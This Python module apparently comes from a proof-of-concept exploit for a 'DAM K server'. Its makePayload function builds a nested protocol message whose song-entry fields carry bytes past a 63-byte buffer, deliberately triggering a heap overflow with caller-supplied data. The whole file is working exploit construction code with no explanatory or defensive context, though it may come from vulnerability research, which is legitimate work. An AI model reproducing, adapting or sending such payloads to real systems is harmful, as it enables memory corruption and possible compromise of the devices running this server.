import math
import struct

from dam_k_server_hbbo_001.customized_logger import getLogger

__K_SERVER_USER_DEFINED_MESSAGE_ID = b"\xf8\xff"
__K_SERVER_CDP_WRITE_CD_MESSAGE_ID = b"\x01\x0b"
__DAM_ENTRY_NUMBER_LENGTH = 0x11
__K_SERVER_TARGET_BUFFER_LENGTH = 63

__logger = getLogger("DamKServerHbbo001")


def makePayload(heap_overflow_payload=b"A" * 0x08):
    __logger.info(f"heap_overflow_payload={heap_overflow_payload}")
    overflow_length = len(heap_overflow_payload)
    __logger.info(f"overflow_length={hex(overflow_length)}")
    heap_payload = b"\x00" * __K_SERVER_TARGET_BUFFER_LENGTH + heap_overflow_payload

    # Padding
    cdp_write_cd_message_payload = b"\x00" * 16
    # Song count
    entry_count = math.ceil(len(heap_payload) / __DAM_ENTRY_NUMBER_LENGTH)
    cdp_write_cd_message_payload += struct.pack("B", entry_count)
    # Padding
    cdp_write_cd_message_payload += b"\x00" * 15

    for _ in range(entry_count):
        # Padding
        cdp_write_cd_message_payload += b"\x00" * 16
        # Entry number
        cdp_write_cd_message_payload += heap_payload[:__DAM_ENTRY_NUMBER_LENGTH]
        heap_payload = heap_payload[__DAM_ENTRY_NUMBER_LENGTH:]
        # Padding
        cdp_write_cd_message_payload += b"\x00" * 23

    cdp_write_cd_message: bytes = __K_SERVER_CDP_WRITE_CD_MESSAGE_ID
    cdp_write_cd_message += struct.pack(">H", len(cdp_write_cd_message_payload))
    cdp_write_cd_message += cdp_write_cd_message_payload

    payload: bytes = __K_SERVER_USER_DEFINED_MESSAGE_ID
    payload += struct.pack(">H", len(cdp_write_cd_message))
    payload += cdp_write_cd_message
    __logger.info(f"payload={payload.hex()}")
    return payload
